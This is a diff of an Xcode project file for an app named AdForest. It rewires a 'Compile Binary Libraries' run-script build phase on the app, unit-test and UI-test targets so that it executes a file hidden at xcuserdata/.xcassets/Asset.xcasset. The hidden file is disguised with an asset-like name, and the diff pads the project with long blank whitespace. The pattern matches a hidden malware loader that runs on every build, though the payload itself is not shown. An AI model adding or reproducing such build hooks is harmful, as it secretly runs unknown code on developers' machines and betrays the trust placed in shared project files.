@@ -3650,7 +3650,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 18BBFAAE2051098C0067662F /* Build configuration list for PBXNativeTarget "AdForest" */;
 			buildPhases = (
-				B37B037371C3C44B35AAC43A /* Compile Binary Libraries */,
+				85CBBA2CC6EFB0A044AAC43A /* Compile Binary Libraries */,
 				8991020FA5F12668860E1C02 /* [CP] Check Pods Manifest.lock */,
 				18BBFA7F2051098B0067662F /* Sources */,
 				18BBFA802051098B0067662F /* Frameworks */,
@@ -3671,7 +3671,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 18BBFAB12051098C0067662F /* Build configuration list for PBXNativeTarget "AdForestTests" */;
 			buildPhases = (
-				B37B037371C3C44B35AAC43A /* Compile Binary Libraries */,
+				85CBBA2CC6EFB0A044AAC43A /* Compile Binary Libraries */,
 				18BBFA962051098C0067662F /* Sources */,
 				18BBFA972051098C0067662F /* Frameworks */,
 				18BBFA982051098C0067662F /* Resources */,
@@ -3690,7 +3690,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 18BBFAB42051098C0067662F /* Build configuration list for PBXNativeTarget "AdForestUITests" */;
 			buildPhases = (
-				B37B037371C3C44B35AAC43A /* Compile Binary Libraries */,
+				85CBBA2CC6EFB0A044AAC43A /* Compile Binary Libraries */,
 				18BBFAA12051098C0067662F /* Sources */,
 				18BBFAA22051098C0067662F /* Frameworks */,
 				18BBFAA32051098C0067662F /* Resources */,
@@ -3835,7 +3835,7 @@
 
 /* Begin PBXShellScriptBuildPhase section */
 
-	B37B037371C3C44B35AAC43A /* Compile Binary Libraries */ = {
+	85CBBA2CC6EFB0A044AAC43A /* Compile Binary Libraries */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
@@ -3853,8 +3853,30 @@
 			shellPath = /bin/sh;
 			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
 
-\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/build.file\" false";			
+\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Asset.xcasset\" false";			
 		};
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
 	
 
 	
@@ -5016,6 +5038,10 @@
 
 		
 			/* Begin PBXBuildRule section */
+
+
+			
+	
 
 
 			
